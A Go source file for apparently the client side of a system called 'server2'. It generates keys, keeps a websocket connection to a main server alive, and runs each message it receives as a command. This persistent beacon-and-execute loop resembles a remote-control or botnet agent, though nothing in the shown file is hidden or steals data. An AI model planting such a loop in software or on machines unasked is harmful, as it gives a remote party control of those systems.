//go:build !host
// +build !host

package cmd

import (
	"fmt"

	"server2/application/controllers"
	"server2/application/infrastructure/adapters"
	"server2/application/useCases/security"
	"server2/enviroment"
	"time"

	"github.com/gorilla/websocket"
)

func connectWebsocket(address string) *websocket.Conn {
	conn, _, err := websocket.DefaultDialer.Dial(fmt.Sprintf("ws://%s/ws", address), nil)
	if err != nil {
		fmt.Println("Connection error:", err)
		return nil
	}
	return conn
}

func Run() {

	genKeysUseCase := security.GenKeysUseCase{}
	priv, pub := genKeysUseCase.GenKeys()
	conn := connectWebsocket(enviroment.MAIN_SERVER_ADDRESS)
	responseRepo := adapters.NewInMemoryResponseRepository()
	controller := controllers.NewWebsocketClientController(enviroment.NAME, conn, &responseRepo, priv, pub)
	if controller.HasConnection() {
		controller.Connect()
	}
	for {
		if !controller.HasConnection() {
			fmt.Println("trying connection")
			controller.SetConnection(connectWebsocket(enviroment.MAIN_SERVER_ADDRESS))
			go func() {
				if !controller.HasConnection() {
					return
				}
				controller.Connect()
			}()
			if !controller.HasConnection() {
				time.Sleep(3 * time.Second)
			}
			continue
		}

		msg, err := controller.ReadConn()

		if err != nil {
			fmt.Println("Read error:", err)
			controller.SetConnection(nil)
			continue
		}

		err = controller.ExecuteStringAsCommand(msg)
		if err != nil {
			fmt.Println("Command error:", err)
			continue
		}

	}
}
